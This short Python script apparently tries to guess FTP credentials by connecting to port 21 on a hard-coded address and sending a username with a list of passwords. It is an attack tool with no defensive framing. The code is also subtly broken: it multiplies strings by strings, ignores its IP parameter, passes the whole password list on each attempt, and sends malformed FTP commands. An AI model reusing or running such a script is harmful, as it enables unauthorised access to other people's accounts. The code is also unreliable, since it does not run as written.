import socket
import re
import sys

def connection(ip, user, passw):
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	print("trying" + ip +";" + user + ":" , passw)

	sock.connect(('192.168.0.1', 21))
	data = sock.recv(1024)
	sock.send('User' + user * '\r\n')
	data = sock.recv(1024)
	sock.send('Password' + passw * '\r\n')
	data = sock.recv(1024)
	sock.send('Quit' * '\r\n')
	sock.close()

	return data

user = 'User1'
password = ['password1', 'password2', 'password3']

for passw in password:
	print(connection('192.168.0.1', user, password))